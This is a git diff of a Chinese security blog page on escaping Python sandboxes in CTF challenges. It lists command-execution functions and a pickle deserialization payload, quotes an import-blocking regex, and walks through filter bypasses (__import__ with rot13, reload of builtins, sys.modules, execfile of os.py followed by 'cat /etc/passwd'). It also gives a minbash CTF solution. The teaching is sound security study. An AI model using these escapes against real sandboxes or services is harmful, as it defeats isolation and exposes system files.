-<p>21.os/subprocess/commands<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.system(&apos;ifconfig&apos;)</span><br><span class="line">os.popen(&apos;ifconfig&apos;)</span><br><span class="line">commands.getoutput(&apos;ifconfig&apos;)</span><br><span class="line">commands.getstatusoutput(&apos;ifconfig&apos;)</span><br><span class="line">subprocess.call([&apos;ifconfig&apos;],shell=True)</span><br></pre></td></tr></table></figure></p>
+<p>基本的语法：<br>序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">test=(&#x27;this is a test&#x27;,3.14,[1,2,3,&quot;hh&quot;])</span><br><span class="line">p=pickle.dumps(test)</span><br></pre></td></tr></table></figure>
+<p>反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n=pickle.loads(p)</span><br></pre></td></tr></table></figure>
+<p>我们可以通过 pickle 的方式加载命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.loads(b&quot;cos\nsystem\n(S&#x27;ls&#x27;\ntR.&quot;)</span><br></pre></td></tr></table></figure>
+<p>21.os&#x2F;subprocess&#x2F;commands</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.system(&#x27;ifconfig&#x27;)</span><br><span class="line">os.popen(&#x27;ifconfig&#x27;)</span><br><span class="line">commands.getoutput(&#x27;ifconfig&#x27;)</span><br><span class="line">commands.getstatusoutput(&#x27;ifconfig&#x27;)</span><br><span class="line">subprocess.call([&#x27;ifconfig&#x27;],shell=True)</span><br></pre></td></tr></table></figure>
 <p>这里重点说一下subprocess 吧</p>
 <ul>
 <li>1.subprocess.run()<br>Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</li>
 <li>2.subprocess.call()<br>执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</li>
-<li>3.subprocess.check_call()<br>Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。</li>
+<li>3.subprocess.check_call()<br>Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check&#x3D;True)。</li>
 <li>4.subprocess.check_output()<br>Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</li>
 <li>5.subprocess.getoutput(cmd)<br>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</li>
 <li>6.subprocess.getstatusoutput(cmd)<br>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</li>
 </ul>
-<p>22.eval/exec/execfile</p>
+<p>22.eval&#x2F;exec&#x2F;execfile</p>
 <ul>
 <li>1.eval(expression):<br>返回python 表达式执行的结果</li>
 <li>2.exec(source)<br>动态执行python代码。也就是说exec可以执行复杂的python代码，而不像eval函数那样只能计算一个表达式的值。exec函数的返回值永远为None。</li>
 <li>3.execfile(filename)<br>执行一个文件的内容<br>文件是将被解析为python序列的类似于模块的文件</li>
 </ul>
-<p>23.importlib模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">importlib.import_module(module)</span><br></pre></td></tr></table></figure></p>
+<p>23.importlib模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">importlib.import_module(module)</span><br></pre></td></tr></table></figure>
 <p>他可以代替import 非常好</p>
 <h3 id="python沙箱逃逸概述"><a href="#python沙箱逃逸概述" class="headerlink" title="python沙箱逃逸概述"></a>python沙箱逃逸概述</h3><p>沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制(waf),最终成功拿到shell权限的过程</p>
 <p>python 能执行命令或者存在执行命令功能的函数是一定的，但是他的存在形式是多样的，他过滤了这种形式我们就换一种形式表示。</p>
@@ -452,37 +475,42 @@ height:50vh;
 <li>使用subprocess</li>
 <li>使用写文件到指定位置,再使用其他辅助手段,总体来说,我们使用以下几个函数,就可以直接愉快的拿到shell啦!</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span class="string">'ifconfig'</span>)</span><br><span class="line">os.popen(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">subprocess.call([<span class="string">'ifconfig'</span>],shell=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">subprocess.call([<span class="string">&#x27;ifconfig&#x27;</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
 <h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>1.直接引入执行命令的模块os等</p>
 <p>遭遇过滤：</p>
-<pre><code>re.compile(&apos;import\s+(os|commands|subprocess|sys)&apos;)
-</code></pre><ul>
+<pre><code>re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)
+</code></pre>
+<ul>
 <li><p>不直接使用import用<code>__import__()</code>取而代之<br>遭遇过滤：<code>__import__(module)</code></p>
 </li>
 <li><p>不直接用<code>__import__(module)</code> 转换编码<br><code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code><br>遭遇过滤<code>__import__</code></p>
 </li>
 </ul>
-<p>2.不用<code>__import__</code>直接调用内建函数<code>__bulitin__/__bulitins__</code><br>常见的一些危险的函数都是<strong>builtin</strong>里面的，我们可以直接用 eval() exec() execfile()<br>遭遇过滤：把<code>__builtin__</code>中的危险函数都del掉，看你怎么绕</p>
-<p>3.<code>reload()</code>函数重新加载完整的没有阉割的<strong>builtin</strong><br><code>reload(__builtin__)</code><br>遭遇过滤：reload()也是一个内建函数，如果我们在<strong>builtin</strong>中把reload()也del掉呢？</p>
-<p>4.imp模块也是一个可以引入东西的一个模块<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure></p>
+<p>2.不用<code>__import__</code>直接调用内建函数<code>__bulitin__/__bulitins__</code><br>常见的一些危险的函数都是__builtin__里面的，我们可以直接用 eval() exec() execfile()<br>遭遇过滤：把<code>__builtin__ </code>中的危险函数都del掉，看你怎么绕</p>
+<p>3.<code>reload()</code>函数重新加载完整的没有阉割的__builtin__<br><code>reload(__builtin__)</code><br>遭遇过滤：reload()也是一个内建函数，如果我们在__builtin__中把reload()也del掉呢？</p>
+<p>4.imp模块也是一个可以引入东西的一个模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure>
 <p>再次成功引入<br>遭遇过滤：看来还是没有从源头del干净，我们知道python 的模块其实都存放在sys.modules中，不要啥就删啥。<br><code>sys.modules[&#39;os&#39;]=None</code><br>这样就ok了</p>
-<p>5.这回问题有点棘手，要知道如何应对还要仔细分析一下import的步骤<br>import 的步骤：<br>1）如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>2）如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中<br>那我们可以向更源头追溯<br>我们都知道任何的模块归根道理都是文件，只要文件还在，我们就一定有办法！<br>比如类unix 的系统中，os 模块的路径一般都是/usr/lib/python2.7/os.py，那我们就直接写这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&apos;os&apos;] = &apos;/usr/lib/python2.7/os.py&apos;</span><br><span class="line">import os</span><br></pre></td></tr></table></figure></p>
+<p>5.这回问题有点棘手，要知道如何应对还要仔细分析一下import的步骤<br>import 的步骤：<br>1）如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>2）如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中<br>那我们可以向更源头追溯<br>我们都知道任何的模块归根道理都是文件，只要文件还在，我们就一定有办法！<br>比如类unix 的系统中，os 模块的路径一般都是&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py，那我们就直接写这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;/usr/lib/python2.7/os.py&#x27;</span><br><span class="line">import os</span><br></pre></td></tr></table></figure>
 <p>遭遇过滤：我把你sys也一并del，让你用！哼</p>
-<p>6.和上面一样的思路，文件还在我们就直接用文件，import 的本质就是把对应的模块文件执行一遍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br><span class="line">system(&apos;cat /etc/passwd&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>6.和上面一样的思路，文件还在我们就直接用文件，import 的本质就是把对应的模块文件执行一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)</span><br><span class="line">system(&#x27;cat /etc/passwd&#x27;)</span><br></pre></td></tr></table></figure>
 <p>遭遇过滤：execfile() 别用了</p>
 <p>7.直接用文件读取函数读入文件，然后再exec() 也能实现一样的效果</p>
-<h2 id="一些题目"><a href="#一些题目" class="headerlink" title="一些题目"></a>一些题目</h2><h3 id="XMAN2018-minbash-SUSCTF-2018"><a href="#XMAN2018-minbash-SUSCTF-2018" class="headerlink" title="XMAN2018 minbash //SUSCTF-2018"></a>XMAN2018 minbash //SUSCTF-2018</h3><p>题解：</p>
+<h2 id="一些题目"><a href="#一些题目" class="headerlink" title="一些题目"></a>一些题目</h2><h3 id="XMAN2018-minbash-x2F-x2F-SUSCTF-2018"><a href="#XMAN2018-minbash-x2F-x2F-SUSCTF-2018" class="headerlink" title="XMAN2018 minbash &#x2F;&#x2F;SUSCTF-2018"></a>XMAN2018 minbash &#x2F;&#x2F;SUSCTF-2018</h3><p>题解：</p>
 <p>ssh连接后发现命令均显示：<code>-rbash: clear: command not found</code></p>
 <p>我们可以尝试python里面的库去执行，用的是os库里面的listdir函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">'.'</span>)   //得到当前目录的结果为   [<span class="string">'.bash_logout'</span>, <span class="string">'.profile'</span>, <span class="string">'.bashrc'</span>, <span class="string">'bin'</span>, <span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>]</span><br><span class="line"></span><br><span class="line">os.path.isfile(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>)  检测是否为文件</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>,<span class="string">'rb'</span>)</span><br><span class="line">f.read()   //即可读到flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&#x27;.&#x27;</span>)   //得到当前目录的结果为   [<span class="string">&#x27;.bash_logout&#x27;</span>, <span class="string">&#x27;.profile&#x27;</span>, <span class="string">&#x27;.bashrc&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;c8049f64c8080af25f414b15cb6f80c3&#x27;</span>]</span><br><span class="line"></span><br><span class="line">os.path.isfile(<span class="string">&#x27;c8049f64c8080af25f414b15cb6f80c3&#x27;</span>)  检测是否为文件</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;c8049f64c8080af25f414b15cb6f80c3&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.read()   //即可读到flag</span><br></pre></td></tr></table></figure>
+
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
-            <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/11/08/python沙盒逃逸/">https://yinwc.github.io/2018/11/08/python沙盒逃逸/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/11/08/python沙盒逃逸/">November 8th 2018, 9:14:20 am</a>
+            <p>原文作者: <a href="https://ysec.github.io">Ywc</a>
+            <p>原文链接: <a href="https://ysec.github.io/2018/11/08/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/">https://ysec.github.io/2018/11/08/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</a>
+            <p>发表日期: <a href="https://ysec.github.io/2018/11/08/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/">November 8th 2018, 9:14:20 am</a>
             <p>版权声明: </p>
         </div>
     
@@ -491,7 +519,7 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/11/08/不包含数字和字母的webshell/" title= 不包含数字和字母的webshell >
+                <a href= "/2018/11/08/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/" title= 不包含数字和字母的webshell >
                     <div class="nextTitle">不包含数字和字母的webshell</div>
                 </a>
             
@@ -499,7 +527,7 @@ height:50vh;
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/11/03/公钥与私钥加密/" title= 理解公钥与私钥 >
+                <a href= "/2018/11/03/%E5%85%AC%E9%92%A5%E4%B8%8E%E7%A7%81%E9%92%A5%E5%8A%A0%E5%AF%86/" title= 理解公钥与私钥 >
                     <div class="prevTitle">理解公钥与私钥</div>
                 </a>
             
@@ -612,7 +640,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python-沙盒逃逸"><span class="toc-number">1.</span> <span class="toc-text">python 沙盒逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><span class="toc-number">1.1.</span> <span class="toc-text">python 绕过沙盒中常见的函数、属性、模块解释（备忘）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python沙箱逃逸概述"><span class="toc-number">1.2.</span> <span class="toc-text">python沙箱逃逸概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击思路"><span class="toc-number">1.3.</span> <span class="toc-text">攻击思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些题目"><span class="toc-number">2.</span> <span class="toc-text">一些题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMAN2018-minbash-SUSCTF-2018"><span class="toc-number">2.1.</span> <span class="toc-text">XMAN2018 minbash //SUSCTF-2018</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">python 沙盒逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python-%E7%BB%95%E8%BF%87%E6%B2%99%E7%9B%92%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0%E3%80%81%E5%B1%9E%E6%80%A7%E3%80%81%E6%A8%A1%E5%9D%97%E8%A7%A3%E9%87%8A%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">python 绕过沙盒中常见的函数、属性、模块解释（备忘）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">python沙箱逃逸概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">攻击思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">一些题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMAN2018-minbash-x2F-x2F-SUSCTF-2018"><span class="toc-number">2.1.</span> <span class="toc-text">XMAN2018 minbash &#x2F;&#x2F;SUSCTF-2018</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -2108,9 +2136,84 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 95
+        Total : 98
         </div>
         <!-- search  -->
         
@@ -2126,22 +2229,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2020/02/18/一次渗透实战/" >从后台getshell到内网漫游</a>
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2020/02/18/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" >从后台getshell到内网漫游</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/08</span><a class="archive-post-title" href= "/2020/02/08/java反序列化漏洞/" >从0开始学Java反序列化漏洞</a>
+            <span class="archive-post-date">02/08</span><a class="archive-post-title" href= "/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" >从0开始学Java反序列化漏洞</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/21</span><a class="archive-post-title" href= "/2020/01/21/应急响应笔记之Linux篇/" >应急响应笔记之Linux篇</a>
+            <span class="archive-post-date">01/21</span><a class="archive-post-title" href= "/2020/01/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0%E4%B9%8BLinux%E7%AF%87/" >应急响应笔记之Linux篇</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2020/01/03/Java代码审计/" >Java代码审计</a>
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2020/01/03/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >Java代码审计</a>
         </li>
     
     
@@ -2155,37 +2258,42 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/31</span><a class="archive-post-title" href= "/2019/12/31/WEB应用漏洞及修复汇总/" >WEB应用漏洞及修复</a>
+            <span class="archive-post-date">12/31</span><a class="archive-post-title" href= "/2019/12/31/WEB%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%B1%87%E6%80%BB/" >WEB应用漏洞及修复</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2019/12/15/Python3爬虫知识梳理/" >Python3爬虫知识梳理</a>
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2019/12/15/Python3%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/" >Python3爬虫知识梳理</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2019/11/20/提权笔记/" >提权笔记</a>
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2019/11/20/%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" >提权笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/Apache-Solr-Velocity模板注入RCE漏洞复现/" >Apache Solr Velocity模板注入RCE漏洞复现</a>
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href= "/2019/11/11/Python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/" >Python虚拟环境管理</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/2019/10/24/甲方安全/" >甲方安全建设</a>
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/Apache-Solr-Velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" >Apache Solr Velocity模板注入RCE漏洞复现</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2019/10/08/面试算法/" >常见算法</a>
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/2019/10/24/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8/" >甲方安全建设</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2019/09/29/zabbix漏洞总结/" >Zabbix漏洞总结</a>
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2019/10/08/%E9%9D%A2%E8%AF%95%E7%AE%97%E6%B3%95/" >常见算法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2019/09/29/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" >Zabbix漏洞总结</a>
         </li>
     
     
@@ -2195,12 +2303,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/IAST安全测试技术/" >应用安全测试技术</a>
+            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/IAST%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF/" >应用安全测试技术</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/02</span><a class="archive-post-title" href= "/2019/09/02/WebminRCE复现/" >WebminRCE复现</a>
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href= "/2019/09/02/WebminRCE%E5%A4%8D%E7%8E%B0/" >WebminRCE复现</a>
         </li>
     
     
@@ -2210,7 +2318,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2019/08/14/内网渗透与后渗透/" >内网渗透</a>
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2019/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E5%90%8E%E6%B8%97%E9%80%8F/" >内网渗透到后渗透的基本思路</a>
         </li>
     
     
@@ -2220,37 +2328,37 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2019/07/25/Anaconda学习笔记/" >Anaconda学习笔记</a>
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2019/07/25/Anaconda%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" >Anaconda学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/06</span><a class="archive-post-title" href= "/2019/07/06/Django学习笔记/" >Django学习笔记</a>
+            <span class="archive-post-date">07/06</span><a class="archive-post-title" href= "/2019/07/06/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" >Django学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/App渗透测试/" >App渗透测试</a>
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" >App渗透测试</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/2019/06/15/SDL安全开发流程/" >SDL安全开发流程</a>
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/2019/06/15/SDL%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/" >SDL安全开发流程</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/02</span><a class="archive-post-title" href= "/2019/06/02/2019国赛华东北赛区线下/" >2019国赛华东北赛区线下</a>
+            <span class="archive-post-date">06/02</span><a class="archive-post-title" href= "/2019/06/02/2019%E5%9B%BD%E8%B5%9B%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B/" >2019国赛华东北赛区线下</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/2019/05/21/AWS搭建SS/" >AWS搭建SS</a>
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/2019/05/21/AWS%E6%90%AD%E5%BB%BASS/" >AWS搭建SS</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/15</span><a class="archive-post-title" href= "/2019/05/15/nps的学习/" >内网渗透--nps的学习</a>
+            <span class="archive-post-date">05/15</span><a class="archive-post-title" href= "/2019/05/15/nps%E7%9A%84%E5%AD%A6%E4%B9%A0/" >内网渗透--nps的学习</a>
         </li>
     
     
@@ -2260,12 +2368,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2019/04/22/异或/" >深入理解异或操作</a>
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2019/04/22/%E5%BC%82%E6%88%96/" >深入理解异或操作</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2019/04/16/MySQL提权/" >MySQL提权</a>
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2019/04/16/MySQL%E6%8F%90%E6%9D%83/" >MySQL提权</a>
         </li>
     
     
@@ -2275,62 +2383,67 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2019/03/20/ACM练习/" >LintCode代码练习</a>
